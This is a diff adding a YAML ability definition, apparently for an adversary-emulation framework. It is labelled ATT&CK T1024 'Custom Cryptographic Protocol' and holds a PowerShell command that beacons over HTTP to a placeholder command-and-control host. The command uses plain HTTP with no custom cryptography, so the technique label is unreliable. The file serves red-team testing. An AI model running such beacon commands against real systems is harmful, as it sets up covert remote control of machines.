@@ -1,0 +1,14 @@
+- id: 2b254c5e-d3d6-4108-9065-34ed8bf188ca
+  name: Custom Cryptographic Protocol
+  description: Ability for Custom Cryptographic Protocol (ATT&CK T1024). Generated
+    from Atomic Red Team procedures; review and test safely before use. [AUTO-INFERRED
+    SAFE STUB]
+  tactic: command-and-control
+  technique:
+    attack_id: T1024
+    name: Custom Cryptographic Protocol
+  platforms:
+    windows:
+      psh:
+        command: powershell -NoProfile -Command "Invoke-WebRequest -UseBasicParsing
+          http://#{c2_host}:#{c2_port}/beacon?id=#{paw} -Method GET"
